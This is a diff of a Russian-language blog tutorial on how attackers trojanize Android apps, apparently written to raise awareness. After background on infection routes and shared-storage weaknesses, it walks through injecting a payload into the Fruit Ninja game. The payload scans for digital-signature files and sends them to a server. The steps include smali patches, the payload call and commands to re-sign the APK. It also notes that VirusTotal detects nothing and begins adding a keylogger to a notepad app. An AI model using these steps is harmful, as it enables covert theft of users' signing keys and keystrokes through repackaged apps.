@@ -90,7 +90,7 @@
  
  Официальный источник имеет защиту от подозрительных приложений, под названием Google Play Protect, которая использует машинное обучение для определения степени вредоносности. Но такая защита не в состоянии точно понять, какое приложение вредоносное, а какое нет, так как для этого требуется полная ручная проверка. Чем отличается шпионское приложение, которое мониторит все ваши передвижения, от приложения для бега? Исследователи [постоянно](https://news.drweb.ru/show/?i=13349&lng=ru) [находят](https://www.zdnet.com/article/android-security-flashlight-apps-on-google-play-infested-with-adware-were-downloaded-by-1-5m-people/) [сотнями](https://www.zdnet.com/article/google-malware-in-google-play-doubled-in-2018-because-of-click-fraud-apps/) [зараженные](https://www.express.co.uk/life-style/science-technology/1143651/Android-warning-malware-Google-Play-Store-security-June-23) [приложения](https://www.vice.com/en_us/article/43z93g/hackers-hid-android-malware-in-google-play-store-exodus-esurv), опубликованные в Google Play.
   
-  Обычно вредоносное приложение называет себя *google play services* или схожим образом, и [ставит похожую иконку](https://www.zdnet.com/article/this-trojan-masquerades-as-google-play-to-hide-on-your-phone). Это вводит в заблуждение пользователей. Почему гугл плей не проверяет иконку на схожесть со своими официальными приложениями - непонятно. Однажды в телеграме, я поставил аватарку с бумажным самолетиком и меня заблокировали. Еще один способ, используемый вредоносными приложениями, это заменой букв ("L" на "I", "g" на "q"), для создания, похожего на официальное приложение, имени:
+  Обычно вредоносное приложение называет себя *google play services* или схожим образом, и [ставит похожую иконку](https://www.zdnet.com/article/this-trojan-masquerades-as-google-play-to-hide-on-your-phone). Это вводит в заблуждение пользователей. Почему гугл плей не проверяет иконку на схожесть со своими официальными приложениями - непонятно. Однажды в телеграме, я поставил аватарку с бумажным самолетиком и меня заблокировали. Еще один способ, используемый вредоносными приложениями, это замена букв ("L" на "I", "g" на "q"), для создания, похожего на официальное приложение, имени:
   
   ![image](/assets/images/spoil_name.png) 
   
@@ -110,15 +110,15 @@
 
 6. [По решению суда и без. Полицией или спецслужбами](https://security.stackexchange.com/questions/194353/police-forcing-me-to-install-jingwang-spyware-app-how-to-minimize-impact)
 
-7. Вы пришли в гости к другу, а его [телевизор заразил ваш телефон](http://www.aftvnews.com/android-malware-worm-that-mines-cryptocurrency-is-infecting-amazon-fire-tv-and-fire-tv-stick-devices/)
+7. [Watering hole attack](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/137/watering-hole-101?ClickID=cqlns7xfva7wwxx4iiw4qfvpxkllkiqwpkz)
+
+8. Вы пришли в гости к другу, а его [телевизор заразил ваш телефон](http://www.aftvnews.com/android-malware-worm-that-mines-cryptocurrency-is-infecting-amazon-fire-tv-and-fire-tv-stick-devices/)
 
 > The particular version appearing on Fire TV devices installs itself as an app called “Test” with the package name “com.google.time.timer”. Once it infects an Android device, it begins to use the device’s resources to mine cryptocurrencies and attempts to spread itself to other Android devices on the same network.
 
-8. [Watering hole attack](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/137/watering-hole-101?ClickID=cqlns7xfva7wwxx4iiw4qfvpxkllkiqwpkz)
-
 ## Как злоумышленники заражают андроид приложения
 
-Теперь мы поняли, как вредоносное приложение может попасть к вам на телефон. Далее будет продемонстировано, как злоумышленник может модифицировать любое андроид приложение. Будет использован пример с внедрением кода в популярную игру [Fruit Ninja](https://play.google.com/store/apps/details?id=com.halfbrick.fruitninjafree). Код сканирует память телефона, ищет файл с ЭЦП и отсылает на сервер.
+Теперь мы поняли, как вредоносное приложение может попасть к вам на телефон. Далее будет продемонстировано, как злоумышленник может модифицировать любое андроид приложение. Будет использован пример с внедрением кода в популярную игру [Fruit Ninja](https://play.google.com/store/apps/details?id=com.halfbrick.fruitninjafree). Код сканирует память телефона, ищет файл с ЭЦП и отсылает на сервер (root естественно не требуется). 
 
 ### Что такое Man-In-The-Disk?
 
@@ -128,7 +128,7 @@
 
 Кто не прочитал, расскажу в кратце. Для начала, определимся с понятиями. В андроиде, память для приложений, разделяется на Internal Storage и External Storage. Internal storage - это внутренняя память приложения, доступная только ему и никому больше. Абсолютно каждому приложению на телефоне соответствует отдельный пользователь и отдельная папка с правами только для этого пользователя. Это отличный защитный механизм. External storage - основная память телефона, доступная всем приложениям (сюда же относится SD карта). Зачем она нужна? Возьмем приложение фоторедактор. После редактирования, вы должны сохранить фото, чтобы оно было доступно из галереи. Естественно, что если вы положите его в internal storage, то никому, кроме вашего приложения оно доступно не будет. Или бразуер, который скачивает все файлы в общую папку Downloads.
 
-У каждого андроид приложения есть свой набор разрешений, которые оно запрашивает. Но с ними все не так хорошо. Среди них есть такие, на которые люди охотно закрывают глаза и не относятся серъезно. Среди них - READ_EXTERNAL_STORAGE. Оно позволяет приложению получать доступ к основной памяти телефона, а значит и ко всем данным других приложений. Никто ведь не удивиться, если приложение "блокнот" запросит данное разрешение. Мало ли, вдруг оно там настройки хранит и кэш. Манипуляция данными других приложений в external storage и есть атака Man-In-The-Disk. Другое, почти дефолтное, разрешение - INTERNET. Как видно из названия, оно позволяет приложению иметь доступ в сеть. Самое печальное, что пользователю не показывается специальное окно с просьбой дать это разрешение. Вы просто прописываете его в своем приложении и вам его дают.
+У каждого андроид приложения есть свой набор разрешений, которые оно запрашивает. Но с ними все не так хорошо. Среди них есть такие, на которые люди охотно закрывают глаза и не относятся серъезно. Среди них - READ_EXTERNAL_STORAGE. Оно позволяет приложению получать доступ к основной памяти телефона, а значит и ко всем данным других приложений. Никто ведь не удивиться, если приложение "блокнот" запросит данное разрешение. Ему может быть необходимо хранить там настройки и кэш. Манипуляция данными других приложений в external storage и есть атака Man-In-The-Disk. Другое, почти дефолтное, разрешение - INTERNET. Как видно из названия, оно позволяет приложению иметь доступ в сеть. Самое печальное, что пользователю не показывается специальное окно с просьбой дать это разрешение. Вы просто прописываете его в своем приложении и вам его дают.
 
 Я скачал топ-15 казахстанских приложений и написал [скрипт](https://github.com/OrderOfSixAngles/Android-permissions-chart), который выводит статистику запрашиваемых разрешений. Как видите, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE и INTERNET очень популярны. Значит злоумышленники могут менее болезнено встраивать код, которые ворует ЭЦП, в большинство приложений.
 
@@ -175,13 +175,17 @@
 
 ![](/assets/images/whatsapp_ssl.png)
 
+Телеграм и Инстаграм хранят в общей памяти закешированные изображения. Практически все просматриваемые вами фото, и те которые вы пересылаете друг другу, доступны любому приложению у вас на телефоне.
+
+![](/assets/images/telegram_external.png)
+
 Google в курсе проблемы и [собирается изменить](https://developer.android.com/preview/privacy/scoped-storage?hl=ru) READ_EXTERNAL_STORAGE в Android Q. Цитата:
 
 > In order to access any other file that another app has created, including files in a "downloads" directory, your app must use the Storage Access Framework, which allows the user to select a specific file. 
 
 ## Создаем payload
 
-Перейдем к основному функционалу. Он будет состоять из трех основных классов: ```StageAttack```, ```MaliciousService```, ```MaliciousTaskManager```.
+Перейдем к основному функционалу сканера. Он будет состоять из трех основных классов: ```StageAttack```, ```MaliciousService```, ```MaliciousTaskManager```. 
 
 ![img](assets\images\sign_scan\prj_struct.png)
 
@@ -290,7 +294,7 @@ private void sendToServer(String path) {
 
 [Источник](https://developer.android.com/reference/android/app/Activity)
 
-Открываем Activity, у меня он лежит по пути "base\smali_classes2\com\halfbrick\mortar\MortarGameLauncherActivity.smali". Если вы до этого не видели smali код, это не страшно, он достаточно прост для **чтения** и логически понятен.
+Открываем Activity, у меня он лежит по пути *base\smali_classes2\com\halfbrick\mortar\MortarGameLauncherActivity.smali*. Если вы до этого не видели smali код, это не страшно, он достаточно прост для **чтения** и логически понятен.
 
 ```java
 .class public Lcom/halfbrick/mortar/MortarGameLauncherActivity;
@@ -390,7 +394,7 @@ true, если данное Activity является первым, которо
 .end method
 ```
 
-Выяснили, что MortarGameLauncherActivity запускает MortarGameActivity и закрывается. Открываем MortarGameActivity. Комментировать полностью его не будем. Нам интересно то, что происходит в методе ```Oncreate```, так как с него начинается создание активити. Сразу после него будем вставлять наш код. Важно не нарушить порядок line, при вставке.
+Выяснили, что ```MortarGameLauncherActivity``` запускает ```MortarGameActivity``` и закрывается. Открываем ```MortarGameActivity```. Комментировать полностью его не будем. Нам интересно то, что происходит в методе ```Oncreate```, так как с него начинается создание активити. Сразу после него будем вставлять наш код. Важно не нарушить порядок line, при вставке.
 
 ```java
 .method protected onCreate(Landroid/os/Bundle;)V
@@ -408,7 +412,7 @@ true, если данное Activity является первым, которо
     :catch_0
     invoke-super {p0, p1}, Landroid/support/v4/app/FragmentActivity;->onCreate(Landroid/os/Bundle;)V
     
-	  <------------------------------------------- вставлять будем сюда, как строку 472
+	  <--------------------------- //вставлять будем сюда, как строку 472
     
     .line 473
     invoke-static {}, Lcom/halfbrick/mortar/NativeGameLib;->TryLoadGameLibrary()Z
@@ -419,7 +423,7 @@ true, если данное Activity является первым, которо
     ...
 ```
 
-Теперь нам нужен smali код payload'а. Собираем в apk наш сканер и декомпилируем. Переносим наши три декомпилированных класса, которые лежат по пути "smali\kz\c\signscan", в папку com/halfbrick/mortar. Меняем *package name* всем классам, с *kz.c.signscan* на *com.halfbrick.mortar*. 
+Теперь нам нужен smali код payload'а. Собираем в apk наш сканер и декомпилируем. Переносим наши три декомпилированных класса, которые лежат по пути *smali\kz\c\signscan*, в папку *com/halfbrick/mortar*. Меняем *package name* всем классам, с *kz.c.signscan* на *com.halfbrick.mortar*. 
 
 Было:
 
@@ -432,12 +436,12 @@ true, если данное Activity является первым, которо
 .class public Lcom/halfbrick/mortar/StageAttack;
 ```
 
-В smali классе MainActivity берем строчку вызова payload'а:
+В smali классе ```MainActivity``` берем строчку вызова payload'а:
 ```java
 invoke-static {p0}, Lcom/halfbrick/mortar/StageAttack;->pwn(Landroid/content/Context;)V
 ```
 
-И вставляем в MortarGameActivity. В итоге метод onCreate() выглядит:
+И вставляем в ```MortarGameActivity```. В итоге метод ```onCreate()``` выглядит:
 
 ```java
 ...
@@ -488,6 +492,10 @@ keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg R
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name
 ```
 
+Virustotal нам ничего не покажет, так как ничего "нелегального" мы делаем. Мы всего-лишь пользуемся доступными разрешениями нашего приложения.
+
+![](/assets/images/ninja_fruit_virustotal.png)
+
 Видео, с демонстрацией конечной работы:
 
 https://youtu.be/e5w5taMY8MA
@@ -496,9 +504,11 @@ https://youtu.be/iBCX_A5FBVU
 
 ## Добавляем кейлоггер в блокнот
 
-В этой части, мы напишем кейллогер и добавим его в [блокнот](https://play.google.com/store/apps/details?id=com.socialnmobile.dictapps.notepad.color.note). Для начала напишем кейлло
+В этой части, я покажу, как злоумышленник может внедрить кейллогер в простой [блокнот](https://play.google.com/store/apps/details?id=com.socialnmobile.dictapps.notepad.color.note). Отличие от предыдущего варианта будет в том, что внедряться, помимо кода, будет еще и GUI элемент. 
 
+### Keylogger не требующий рута
 
+На данный момент, мне известно два способа создания кейлоггера под андроид
 Скачиваем приложение, декомпилируем. Открываем манифест, находим активити.
 
 ```xml
